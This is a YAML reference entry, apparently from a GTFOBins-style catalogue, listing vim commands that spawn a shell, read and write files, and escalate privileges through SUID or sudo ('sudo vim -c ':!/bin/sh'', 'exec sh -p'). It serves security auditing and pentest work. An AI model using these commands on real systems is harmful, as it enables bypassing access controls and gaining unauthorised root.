---
functions:
  shell:
    - code: vim -c ':!/bin/sh'
    - code: |
        vim
        :set shell=/bin/sh
        :shell
    - description: This requires that `vim` is compiled with Python support.
      code: vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
  file-write:
    - code: |
        vim file_to_write
        iDATA
        ^[
        w
  file-read:
    - code: vim file_to_read
  suid:
    - code: ./vim -c ':!/bin/sh -p'
    - description: This requires that `vim` is compiled with Python support.
      code: ./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
  sudo:
    - code: sudo vim -c ':!/bin/sh'
    - description: This requires that `vim` is compiled with Python support.
      code: sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
---
